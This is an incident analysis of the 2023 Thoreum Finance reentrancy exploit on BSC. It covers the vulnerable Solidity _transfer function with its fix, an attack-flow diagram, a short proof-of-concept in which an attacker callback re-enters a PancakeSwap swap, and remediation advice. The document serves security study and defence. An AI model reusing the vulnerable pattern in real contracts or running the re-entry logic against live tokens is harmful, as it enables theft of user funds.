# Thoreum Finance — Reentrancy Attack During Token Transfer Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-16 |
| **Protocol** | Thoreum Finance |
| **Chain** | BSC |
| **Loss** | ~2000 BNB |
| **Attacker** | [0x1ae2dc57...](https://bscscan.com/address/0x1ae2dc57399b2f4597366c5bf4fe39859c006f99) |
| **Attack Tx** | [0x3fe3a188...](https://bscscan.com/tx/0x3fe3a1883f0ae263a260f7d3e9b462468f4f83c2c88bb89d1dee5d7d24262b51) |
| **Vulnerable Contract** | [0xce1b3e50...](https://bscscan.com/address/0xce1b3e5087e8215876af976032382dd338cf8401) |
| **Root Cause** | External callback possible within token transfer function without reentrancy protection |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/ThoreumFinance_exp.sol) |

---
## 1. Vulnerability Overview

Thoreum Finance's token contract contains logic that calls an external contract inside the `_transfer()` function. At the point of this external call, an attacker was able to reenter and repeatedly invoke the same transfer function, allowing them to receive tokens multiple times before the balance was actually deducted.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: external call before state update inside _transfer()
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "Insufficient balance");

    // ❌ External call occurs before state update
    if (isContract(recipient)) {
        ITokenReceiver(recipient).onTokenReceived(sender, amount);  // ❌ Reentrancy possible
    }

    // If attacker reenters at this point, senderBalance check passes again
    _balances[sender] = senderBalance - amount;
    _balances[recipient] += amount;
}

// ✅ Fix: Apply Checks-Effects-Interactions pattern
function _transfer(address sender, address recipient, uint256 amount) internal {
    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "Insufficient balance");

    // ✅ Update state first
    _balances[sender] = senderBalance - amount;
    _balances[recipient] += amount;

    // ✅ External call after
    if (isContract(recipient)) {
        ITokenReceiver(recipient).onTokenReceived(sender, amount);
    }
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: external callback possible within token transfer function without reentrancy protection
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker Contract
  │
  ├─1─▶ Router.swapExactTokensForTokens()
  │       WBNB → THOREUM swap request
  │
  ├─2─▶ THOREUM._transfer(router, attacker, amount)
  │       Calls onTokenReceived() before deducting balance
  │       │
  │       └─3─▶ attacker.onTokenReceived() reenters
  │                 │
  │                 ├─4─▶ Calls swap again (reentrant)
  │                 │      Balance not yet deducted, so check passes
  │                 └─5─▶ Receives additional THOREUM
  │
  ├─6─▶ Original transfer completes (tokens already received multiple times)
  │
  └─7─▶ THOREUM → WBNB sell → profit realized
```

## 4. PoC Code (Core Logic + Comments)

```solidity
// Exploiting reentrancy via PancakeSwap Router
function attack() external {
    // 1. Begin purchasing THOREUM with a small amount of WBNB
    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        wbnbAmount, 0, path, address(this), block.timestamp
    );
    // Reentrancy occurs inside the transfer callback
}

// Token receive callback (reentrancy entry point)
function onTokenReceived(address, uint256 amount) external {
    if (reentrancyCount < MAX_REENTRANCE) {
        reentrancyCount++;
        // Reenter: balance not yet deducted, so tokens can be received again under the same conditions
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnbAmount, 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Vector** | Abusing external callback during token transfer |
| **Impact Scope** | Entire token contract balance |
| **DASP Classification** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |

## 6. Remediation Recommendations

1. **Follow CEI Pattern**: Structure code in Checks → Effects → Interactions order.
2. **Apply ReentrancyGuard**: Use OpenZeppelin's `nonReentrant` modifier.
3. **Minimize External Calls**: Avoid calling external contracts inside `_transfer()`.

## 7. Lessons Learned

- External calls within token transfer functions always carry reentrancy risk.
- Since the 2016 DAO hack, the CEI pattern has been a fundamental Solidity principle, yet violations continue to occur.
- Detected by Ancilia's real-time monitoring, but most of the damage had already been done by the time of detection.